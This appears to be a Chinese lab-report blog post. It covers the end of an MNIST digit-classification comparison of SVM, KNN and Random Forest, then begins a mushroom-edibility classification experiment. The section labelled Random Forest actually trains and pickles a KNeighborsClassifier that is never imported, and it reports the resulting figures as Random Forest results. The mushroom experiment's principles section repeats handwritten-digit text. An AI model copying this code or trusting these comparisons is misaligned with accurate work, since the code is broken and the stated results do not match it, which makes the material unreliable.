<p><img src="https://images-1314484890.cos.ap-nanjing.myqcloud.com/Obsidian/202306042346848.png" alt="image.png"></p>
<p>然后进行对已训练分类器的性能在测试数据集上的评估和预测：</p>
<p><strong>代码解析：</strong></p>
<ol>
<li>使用已训练分类器对测试数据集进行预测。通过调用<code>clf.predict(test_img)</code>方法，得到分类器对测试数据集的预测结果，将其赋值给变量<code>test_labels_pred</code>。</li>
<li>计算已训练分类器在测试数据集上的准确率。通过调用<code>accuracy_score(test_labels, test_labels_pred)</code>方法，计算分类器在测试数据集上的预测准确率，将其赋值给变量<code>acc</code>。</li>
<li>创建并显示测试数据集的混淆矩阵。通过调用<code>confusion_matrix(test_labels, test_labels_pred)</code>方法，得到测试数据集的混淆矩阵，然后使用<code>plt.matshow</code>等函数绘制混淆矩阵的可视化。</li>
</ol>
<p>具体代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\nMaking Predictions on Test Input Images...&#x27;</span>)</span><br><span class="line">test_labels_pred = clf.predict(test_img)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\nCalculating Accuracy of Trained Classifier on Test Data... &#x27;</span>)</span><br><span class="line">acc = accuracy_score(test_labels,test_labels_pred)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n Creating Confusion Matrix for Test Data...&#x27;</span>)</span><br><span class="line">conf_mat_test = confusion_matrix(test_labels,test_labels_pred)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\nPredicted Labels for Test Images: &#x27;</span>,test_labels_pred)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\nAccuracy of Classifier on Test Images: &#x27;</span>,acc)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\nConfusion Matrix for Test Data: \n&#x27;</span>,conf_mat_test)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Plot Confusion Matrix for Test Data</span></span><br><span class="line">plt.matshow(conf_mat_test)</span><br><span class="line">plt.title(<span class="string">&#x27;Confusion Matrix for Test Data&#x27;</span>)</span><br><span class="line">plt.colorbar()</span><br><span class="line">plt.ylabel(<span class="string">&#x27;True label&#x27;</span>)</span><br><span class="line">plt.xlabel(<span class="string">&#x27;Predicted label&#x27;</span>)</span><br><span class="line">plt.axis(<span class="string">&#x27;off&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
<p>输出结果：<br><code>Predicted Labels for Test Images:  [7 2 1 ... 4 5 6]</code><br><code>Accuracy of Classifier on Test Images:  0.9783</code><br>Confusion Matrix for Test Data:<br> [[ 972    0    1    1    0    3    1    0    2    0]<br> [   0 1127    2    1    0    0    3    0    2    0]<br> [   5    1 1007    0    2    0    4    7    6    0]<br> [   0    2    2  985    0    7    0    4    6    4]<br> [   2    0    2    0  966    0    3    0    0    9]<br> [   2    0    2   11    1  863    4    1    5    3]<br> [   5    5    1    0    3    6  936    0    2    0]<br> [   0   10    9    1    1    0    0 1001    0    6]<br> [   6    0    1    3    2    4    2    3  951    2]<br> [   2    7    1    5   10    3    1    2    3  975]]</p>
<p><img src="https://images-1314484890.cos.ap-nanjing.myqcloud.com/Obsidian/202306042346849.png" alt="image.png"></p>
<h5 id="2-5-显示预测结果"><a href="#2-5-显示预测结果" class="headerlink" title="2.5 显示预测结果"></a>2.5 显示预测结果</h5><p>随机选择一些测试图像，将原始标签和预测标签显示在图像上，以便观察分类器的预测效果。</p>
<p>具体代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Show the Test Images with Original and Predicted Labels</span></span><br><span class="line">a = np.random.randint(<span class="number">1</span>,<span class="number">40</span>,<span class="number">15</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">	two_d = (np.reshape(test_img[i], (<span class="number">28</span>, <span class="number">28</span>)) * <span class="number">255</span>).astype(np.uint8)</span><br><span class="line">	plt.title(<span class="string">&#x27;Original Label: &#123;0&#125;  Predicted Label: &#123;1&#125;&#x27;</span>.<span class="built_in">format</span>(test_labels[i],test_labels_pred[i]))</span><br><span class="line">	plt.imshow(two_d, interpolation=<span class="string">&#x27;nearest&#x27;</span>,cmap=<span class="string">&#x27;gray&#x27;</span>)</span><br><span class="line">	plt.show()</span><br></pre></td></tr></table></figure>
<p>输出效果如下：</p>
<h4 id="3-基于Random-Forest-Classifier实现"><a href="#3-基于Random-Forest-Classifier实现" class="headerlink" title="3. 基于Random Forest Classifier实现"></a>3. 基于Random Forest Classifier实现</h4><h5 id="3-1-相关库的导入"><a href="#3-1-相关库的导入" class="headerlink" title="3.1 相关库的导入"></a>3.1 相关库的导入</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> sklearn <span class="keyword">import</span> model_selection</span><br><span class="line"><span class="keyword">from</span> sklearn.ensemble <span class="keyword">import</span> RandomForestClassifier</span><br><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> accuracy_score, confusion_matrix</span><br><span class="line"><span class="keyword">from</span> MNIST_Dataset_Loader.mnist_loader <span class="keyword">import</span> MNIST</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">from</span> matplotlib <span class="keyword">import</span> style</span><br><span class="line">style.use(<span class="string">&#x27;ggplot&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h5 id="3-2-数据加载和准备"><a href="#3-2-数据加载和准备" class="headerlink" title="3.2 数据加载和准备"></a>3.2 数据加载和准备</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\nLoading MNIST Data...&#x27;</span>)</span><br><span class="line"><span class="comment"># data = MNIST(&#x27;./python-mnist/data/&#x27;)</span></span><br><span class="line"></span><br><span class="line">data = MNIST(<span class="string">&#x27;E:\MNIST_Dataset_Loader\dataset&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\nLoading Training Data...&#x27;</span>)</span><br><span class="line">img_train, labels_train = data.load_training()</span><br><span class="line">train_img = np.array(img_train)</span><br><span class="line">train_labels = np.array(labels_train)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\nLoading Testing Data...&#x27;</span>)</span><br><span class="line">img_test, labels_test = data.load_testing()</span><br><span class="line">test_img = np.array(img_test)</span><br><span class="line">test_labels = np.array(labels_test)</span><br></pre></td></tr></table></figure>
<p><strong>代码解析：</strong></p>
<ol>
<li>MNIST数据集是一个广泛使用的手写数字数据集，包含了大量的手写数字图像和相应的标签。</li>
<li>使用MNIST数据加载器加载训练数据和测试数据，并将其转换为NumPy数组。</li>
</ol>
<h5 id="3-3-创建和训练RFC分类器"><a href="#3-3-创建和训练RFC分类器" class="headerlink" title="3.3 创建和训练RFC分类器"></a>3.3 创建和训练RFC分类器</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Features</span></span><br><span class="line">X = train_img</span><br><span class="line"></span><br><span class="line"><span class="comment">#Labels</span></span><br><span class="line">y = train_labels</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\nPreparing Classifier Training and Validation Data...&#x27;</span>)</span><br><span class="line">X_train, X_test, y_train, y_test = model_selection.train_test_split(X,y,test_size=<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\nKNN Classifier with n_neighbors = 5, algorithm = auto, n_jobs = 10&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\nPickling the Classifier for Future Use...&#x27;</span>)</span><br><span class="line">clf = KNeighborsClassifier(n_neighbors=<span class="number">5</span>,algorithm=<span class="string">&#x27;auto&#x27;</span>,n_jobs=<span class="number">10</span>)</span><br><span class="line">clf.fit(X_train,y_train)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;MNIST_KNN.pickle&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">	pickle.dump(clf, f)</span><br></pre></td></tr></table></figure>
<p><strong>代码解析：</strong></p>
<ol>
<li>使用<code>train_test_split</code>函数将训练数据划分为训练集和验证集。</li>
<li>使用<code>KNeighborsClassifier</code>类创建一个K最近邻分类器。</li>
<li>将训练图像作为特征（X）和对应的标签（y）传递给分类器，使用训练集对KNN分类器进行训练。</li>
<li>将训练好的分类器保存到文件中，以便将来使用。</li>
</ol>
<h5 id="3-4-验证和评估分类器"><a href="#3-4-验证和评估分类器" class="headerlink" title="3.4 验证和评估分类器"></a>3.4 验证和评估分类器</h5><p>在这部分代码中，首先使用<code>pickle.load</code>函数从文件中加载之前保存的KNN分类器对象。具体步骤如下：</p>
<ol>
<li>打开文件<code>MNIST_KNN.pickle</code>，以二进制读取模式进行操作。<code>&#39;rb&#39;</code>表示以二进制读取模式打开文件。</li>
<li>使用<code>pickle.load</code>函数从文件中加载KNN分类器对象，并将其赋值给变量<code>clf</code>。<br>具体代码如下：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pickle_in = <span class="built_in">open</span>(<span class="string">&#x27;MNIST_KNN.pickle&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">clf = pickle.load(pickle_in)</span><br></pre></td></tr></table></figure></li>
</ol>
<p>接下来，先进行对已训练分类器的性能在验证数据集上的评估和预测：</p>
<p><strong>代码解析：</strong></p>
<ol>
<li>计算已训练分类器在验证数据集上的准确率。通过调用<code>clf.score(X_test, y_test)</code>方法，得到分类器在验证数据集上的准确率，将其赋值给变量<code>confidence</code>。</li>
<li>使用已训练分类器对验证数据集进行预测。通过调用<code>clf.predict(X_test)</code>方法，得到分类器对验证数据集的预测结果，将其赋值给变量<code>y_pred</code>。</li>
<li>计算预测结果的准确率。通过调用<code>accuracy_score(y_test, y_pred)</code>方法，计算分类器的预测准确率，将其赋值给变量<code>accuracy</code>。</li>
<li>创建并显示验证数据集的混淆矩阵。通过调用<code>confusion_matrix(y_test, y_pred)</code>方法，得到验证数据集的混淆矩阵，然后使用<code>plt.matshow</code>等函数绘制混淆矩阵的可视化。</li>
</ol>
<p>具体代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\nCalculating Accuracy of trained Classifier...&#x27;</span>)</span><br><span class="line">confidence = clf.score(X_test,y_test)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\nMaking Predictions on Validation Data...&#x27;</span>)</span><br><span class="line">y_pred = clf.predict(X_test)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\nCalculating Accuracy of Predictions...&#x27;</span>)</span><br><span class="line">accuracy = accuracy_score(y_test, y_pred)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\nCreating Confusion Matrix...&#x27;</span>)</span><br><span class="line">conf_mat = confusion_matrix(y_test,y_pred)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\nKNN Trained Classifier Confidence: &#x27;</span>,confidence)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\nPredicted Values: &#x27;</span>,y_pred)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\nAccuracy of Classifier on Validation Image Data: &#x27;</span>,accuracy)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\nConfusion Matrix: \n&#x27;</span>,conf_mat)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Plot Confusion Matrix Data as a Matrix</span></span><br><span class="line">plt.matshow(conf_mat)</span><br><span class="line">plt.title(<span class="string">&#x27;Confusion Matrix for Validation Data&#x27;</span>)</span><br><span class="line">plt.colorbar()</span><br><span class="line">plt.ylabel(<span class="string">&#x27;True label&#x27;</span>)</span><br><span class="line">plt.xlabel(<span class="string">&#x27;Predicted label&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
<p>输出结果：<br><code>RFC Trained Classifier Confidence:  0.9695</code><br><code>Predicted Values:  [6 0 8 ... 7 3 1]</code><br><code>Accuracy of Classifier on Validation Image Data:  0.9695</code><br>Confusion Matrix:<br> [[568   0   1   1   1   0   1   0   9   0]<br> [  0 692   1   1   2   0   0   1   0   0]<br> [  1   1 586   2   2   0   2   4   2   0]<br> [  3   0   7 572   2   4   1   2   6   1]<br> [  0   0   2   0 579   1   2   1   2   8]<br> [  1   0   0  11   3 520   3   0   2   4]<br> [  3   3   1   0   0   4 569   0   2   0]<br> [  0   4   6   0   4   0   0 561   1   2]<br> [  0   6   4   5   4   6   3   0 577   6]<br> [  5   1   0   6   6   0   0   2   1 593]]</p>
<p><img src="https://images-1314484890.cos.ap-nanjing.myqcloud.com/Obsidian/202306042346850.png" alt="image.png"></p>
<p>然后进行对已训练分类器的性能在测试数据集上的评估和预测：</p>
<p><strong>代码解析：</strong></p>
<ol>
<li>使用已训练分类器对测试数据集进行预测。通过调用<code>clf.predict(test_img)</code>方法，得到分类器对测试数据集的预测结果，将其赋值给变量<code>test_labels_pred</code>。</li>
<li>计算已训练分类器在测试数据集上的准确率。通过调用<code>accuracy_score(test_labels, test_labels_pred)</code>方法，计算分类器在测试数据集上的预测准确率，将其赋值给变量<code>acc</code>。</li>
<li>创建并显示测试数据集的混淆矩阵。通过调用<code>confusion_matrix(test_labels, test_labels_pred)</code>方法，得到测试数据集的混淆矩阵，然后使用<code>plt.matshow</code>等函数绘制混淆矩阵的可视化。</li>
</ol>
<p>具体代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\nMaking Predictions on Test Input Images...&#x27;</span>)</span><br><span class="line">test_labels_pred = clf.predict(test_img)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\nCalculating Accuracy of Trained Classifier on Test Data... &#x27;</span>)</span><br><span class="line">acc = accuracy_score(test_labels,test_labels_pred)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n Creating Confusion Matrix for Test Data...&#x27;</span>)</span><br><span class="line">conf_mat_test = confusion_matrix(test_labels,test_labels_pred)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\nPredicted Labels for Test Images: &#x27;</span>,test_labels_pred)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\nAccuracy of Classifier on Test Images: &#x27;</span>,acc)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\nConfusion Matrix for Test Data: \n&#x27;</span>,conf_mat_test)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Plot Confusion Matrix for Test Data</span></span><br><span class="line">plt.matshow(conf_mat_test)</span><br><span class="line">plt.title(<span class="string">&#x27;Confusion Matrix for Test Data&#x27;</span>)</span><br><span class="line">plt.colorbar()</span><br><span class="line">plt.ylabel(<span class="string">&#x27;True label&#x27;</span>)</span><br><span class="line">plt.xlabel(<span class="string">&#x27;Predicted label&#x27;</span>)</span><br><span class="line">plt.axis(<span class="string">&#x27;off&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
<p>输出结果：<br><code>Predicted Labels for Test Images:  [7 2 1 ... 4 5 6]</code><br><code>Accuracy of Classifier on Test Images:  0.9677</code><br>Confusion Matrix for Test Data:<br> [[ 968    0    0    0    0    2    5    1    4    0]<br> [   0 1124    3    3    1    2    1    0    1    0]<br> [   6    0  996    6    3    0    4   10    7    0]<br> [   0    0   11  971    0    8    0    9    7    4]<br> [   1    0    3    0  950    0    4    1    2   21]<br> [   4    0    1    9    3  859    5    2    8    1]<br> [   5    3    0    0    4    3  940    0    3    0]<br> [   1    3   17    1    0    0    0  991    3   12]<br> [   7    0    5   10    6    6    4    3  918   15]<br> [   6    6    3   13   10    3    1    3    4  960]]</p>
<p><img src="https://images-1314484890.cos.ap-nanjing.myqcloud.com/Obsidian/202306042346851.png" alt="image.png"></p>
<h5 id="3-5-显示预测结果"><a href="#3-5-显示预测结果" class="headerlink" title="3.5 显示预测结果"></a>3.5 显示预测结果</h5><p>随机选择一些测试图像，将原始标签和预测标签显示在图像上，以便观察分类器的预测效果。</p>
<p>具体代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Show the Test Images with Original and Predicted Labels</span></span><br><span class="line">a = np.random.randint(<span class="number">1</span>,<span class="number">50</span>,<span class="number">20</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">	two_d = (np.reshape(test_img[i], (<span class="number">28</span>, <span class="number">28</span>)) * <span class="number">255</span>).astype(np.uint8)</span><br><span class="line">	plt.title(<span class="string">&#x27;Original Label: &#123;0&#125;  Predicted Label: &#123;1&#125;&#x27;</span>.<span class="built_in">format</span>(test_labels[i],test_labels_pred[i]))</span><br><span class="line">	plt.imshow(two_d, interpolation=<span class="string">&#x27;nearest&#x27;</span>,cmap=<span class="string">&#x27;gray&#x27;</span>)</span><br><span class="line">	plt.show()</span><br></pre></td></tr></table></figure>
<p>输出效果如下：<br><img src="https://images-1314484890.cos.ap-nanjing.myqcloud.com/Obsidian/202306042346852.png" alt="image.png"></p>
<h1 id="四、实验结果-4"><a href="#四、实验结果-4" class="headerlink" title="四、实验结果"></a>四、实验结果</h1><p>分别使用了K Nearest Neighbors、SVM以及Random Forest Classifier模型实现了手写体的识别。<br>对比他们在测试集上的表现：<br>K Nearest Neighbors：<code>Accuracy of Classifier on Test Images:  0.9675</code><br>SVM：<code>Accuracy of Classifier on Test Images:  0.9783</code><br>Random Forest Classifier：<code>Accuracy of Classifier on Test Images:  0.9677</code><br>由上述数据得出，SVM模型在手写体识别的测试集上具有最高的准确率。</p>
<h1 id="五、实验分析-4"><a href="#五、实验分析-4" class="headerlink" title="五、实验分析"></a>五、实验分析</h1><p>此次实验，在三个模型上进行了手写体识别的准确率的评估，但在模型考察上较为单一，往后可以考虑用更多评价指标来对模型进行评估，以此获得更加全面的模型报告。</p>
<h1 id="实验六"><a href="#实验六" class="headerlink" title="实验六"></a>实验六</h1><h1 id="一、实验目的-5"><a href="#一、实验目的-5" class="headerlink" title="一、实验目的"></a>一、实验目的</h1><p>(1)目的是建立一个模型，可以根据蘑菇的特征预测蘑菇的食用性。<br>(2) 写出实验报告。</p>
<h1 id="二、实验原理-5"><a href="#二、实验原理-5" class="headerlink" title="二、实验原理"></a>二、实验原理</h1><p>(1)支持向量机（SVM）： 支持向量机是一种监督学习算法，用于二分类和多分类问题。在手写体识别任务中，S和VM可以被用来将手写数字图像分为不同的类别。SVM通过寻找一个最优的超平面来将不同类别的数据点分开。对于手写数字识别，每个图像被表示为一组特征向量，并与相应的标签（数字类别）相关联。SVM通过学习一个决策边界，使得不同类别的图像在特征空间中被最大化地分离。  </p>
<p>(2)K最近邻算法（K Nearest Neighbors）： K最近邻算法是一种基于实例的学习方法，用于分类和回归问题。对于手写体识别任务，K最近邻算法可以用于根据与目标图像最相似的K个训练样本的标签来预测目标图像的类别。算法通过计算目标图像与所有训练图像之间的距离（如欧氏距离）来确定最相似的训练样本，然后根据K个最相似样本的标签进行投票来确定目标图像的类别。   </p>
<p>(3) 随机森林分类器（Random Forest Classifier）： 随机森林是一种集成学习方法，它由多个决策树组成。每个决策树都是基于不同的训练样本和特征子集构建的。在手写体识别任务中，随机森林分类器可以通过将图像的特征输入到每个决策树中，并将决策树的预测结果进行投票来确定图像的类别。随机森林具有良好的泛化能力和抗过拟合能力，并且在处理高维特征空间和大规模数据集时表现良好</p>
<h1 id="三、实验内容和步骤-5"><a href="#三、实验内容和步骤-5" class="headerlink" title="三、实验内容和步骤"></a>三、实验内容和步骤</h1><h2 id="1-实验内容-5"><a href="#1-实验内容-5" class="headerlink" title="(1)实验内容"></a>(1)实验内容</h2><ol>
<li>用python编写程序，通过SVM、K Nearest Neighbors、Random Forest Classifier分别实现根据蘑菇的特征预测蘑菇的食用性</li>
<li>分别评估模型</li>
</ol>
<h2 id="2-实验步骤-5"><a href="#2-实验步骤-5" class="headerlink" title="(2)实验步骤"></a>(2)实验步骤</h2><ol>
<li>相关库的导入</li>
<li>预处理和数据分析</li>
<li>机器学习模型</li>
</ol>
<p>具体步骤：</p>
<h3 id="1-相关库的导入"><a href="#1-相关库的导入" class="headerlink" title="1. 相关库的导入"></a>1. 相关库的导入</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os <span class="comment">#paths to file</span></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np <span class="comment"># linear algebra</span></span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd <span class="comment"># data processing</span></span><br><span class="line"><span class="keyword">import</span> warnings<span class="comment"># warning filter</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#ploting libraries</span></span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt </span><br><span class="line"><span class="keyword">import</span> seaborn <span class="keyword">as</span> sns</span><br><span class="line"></span><br><span class="line"><span class="comment">#feature engineering</span></span><br><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> OneHotEncoder</span><br><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> LabelEncoder</span><br><span class="line"></span><br><span class="line"><span class="comment">#train test split</span></span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split</span><br><span class="line"></span><br><span class="line"><span class="comment">#metrics</span></span><br><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> f1_score</span><br><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> accuracy_score</span><br><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> recall_score</span><br><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> precision_score</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> cross_validate</span><br><span class="line"></span><br><span class="line"><span class="comment">#cross validation</span></span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection  <span class="keyword">import</span> cross_val_score <span class="keyword">as</span> CVS</span><br><span class="line"></span><br><span class="line"><span class="comment">#ML models</span></span><br><span class="line"><span class="keyword">from</span> xgboost <span class="keyword">import</span> XGBClassifier</span><br><span class="line"><span class="keyword">from</span> sklearn.tree <span class="keyword">import</span> DecisionTreeClassifier</span><br><span class="line"><span class="keyword">from</span> sklearn.ensemble <span class="keyword">import</span> RandomForestClassifier</span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> LogisticRegression</span><br><span class="line"><span class="keyword">from</span> sklearn.svm <span class="keyword">import</span> SVC</span><br><span class="line"></span><br><span class="line"><span class="comment">#default theme and settings</span></span><br><span class="line">sns.<span class="built_in">set</span>(context=<span class="string">&#x27;notebook&#x27;</span>, style=<span class="string">&#x27;darkgrid&#x27;</span>, palette=<span class="string">&#x27;deep&#x27;</span>, font=<span class="string">&#x27;sans-serif&#x27;</span>, font_scale=<span class="number">1</span>, color_codes=<span class="literal">False</span>, rc=<span class="literal">None</span>)</span><br><span class="line">pd.set_option(<span class="string">&#x27;display.max_columns&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#warning handle</span></span><br><span class="line">warnings.filterwarnings(<span class="string">&quot;always&quot;</span>)</span><br><span class="line">warnings.filterwarnings(<span class="string">&quot;ignore&quot;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="2-预处理和数据分析"><a href="#2-预处理和数据分析" class="headerlink" title="2.预处理和数据分析"></a>2.预处理和数据分析</h3><h4 id="2-1-导入数据与查看"><a href="#2-1-导入数据与查看" class="headerlink" title="2.1 导入数据与查看"></a>2.1 导入数据与查看</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Mushroom_df = pd.read_csv(Mushroom_path)</span><br><span class="line">Mushroom_df.head()</span><br></pre></td></tr></table></figure>
<p>输出：<br><img src="https://images-1314484890.cos.ap-nanjing.myqcloud.com/Obsidian/202306042347328.png" alt="image.png"></p>
<h4 id="2-2-数据维度"><a href="#2-2-数据维度" class="headerlink" title="2.2 数据维度"></a>2.2 数据维度</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;Data Shape (row, col): &#123;&#125;&quot;</span>.<span class="built_in">format</span>(Mushroom_df.shape)</span><br></pre></td></tr></table></figure>
<p>输出：<br><code>Data Shape (row, col): (8124, 23)</code></p>
<h4 id="2-3-数据基本信息"><a href="#2-3-数据基本信息" class="headerlink" title="2.3 数据基本信息"></a>2.3 数据基本信息</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mushroom_df.info()</span><br></pre></td></tr></table></figure>
<p>输出：<br><img src="https://images-1314484890.cos.ap-nanjing.myqcloud.com/Obsidian/202306042347329.png" alt="image.png"></p>
